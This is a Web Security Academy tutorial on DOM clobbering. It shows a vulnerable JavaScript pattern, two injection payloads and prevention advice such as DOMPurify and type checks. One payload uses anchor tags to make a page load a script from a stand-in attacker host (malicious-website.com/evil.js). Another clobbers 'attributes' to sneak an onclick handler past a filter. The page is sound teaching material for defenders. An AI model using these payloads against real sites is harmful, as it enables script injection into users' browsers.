# DOM clobbering

Source: https://portswigger.net/web-security/dom-based/dom-clobbering
Fetched: 2026-06-28T09:17:48.599868+00:00

Web Security Academy

DOM-based

DOM clobbering

DOM clobbering

In this section, we will describe what DOM clobbering is, demonstrate how you can exploit DOM vulnerabilities using clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.

What is DOM clobbering?

DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.

The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form's actual submit() function.

How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

var someObject = window.someObject || {};

If you can control some of the HTML on the page, you can clobber the someObject reference with a DOM node, such as an anchor. Consider the following code:

<script>

window.onload = function(){

let someObject = window.someObject || {};

let script = document.createElement('script');

script.src = someObject.url;

document.body.appendChild(script);

};

</script>

To exploit this vulnerable code, you could inject the following HTML to clobber the someObject reference with an anchor element:

<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

Another common technique is to use a form element along with an element such as input to clobber DOM properties. For example, clobbering the attributes property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the attributes property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:

<form onclick=alert(1)><input id=attributes>Click me

In this case, the client-side filter would traverse the DOM and encounter a whitelisted form element. Normally, the filter would loop through the attributes property of the form element and remove any blacklisted attributes. However, because the attributes property has been clobbered with the input element, the filter loops through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example i<element.attributes.length) are not met, and the filter simply moves on to the next element instead. This results in the onclick event being ignored altogether by the filter, which subsequently allows the alert() function to be called in the browser.

How to prevent DOM-clobbering attacks

In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of NamedNodeMap. This ensures that the property is an attributes property and not a clobbered HTML element.

You should also avoid writing code that references a global variable in conjunction with the logical OR operator ||, as this can lead to DOM clobbering vulnerabilities.

In summary:

Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.

Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.

Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

Find DOM-based vulnerabilities using Burp Suite

Try for free
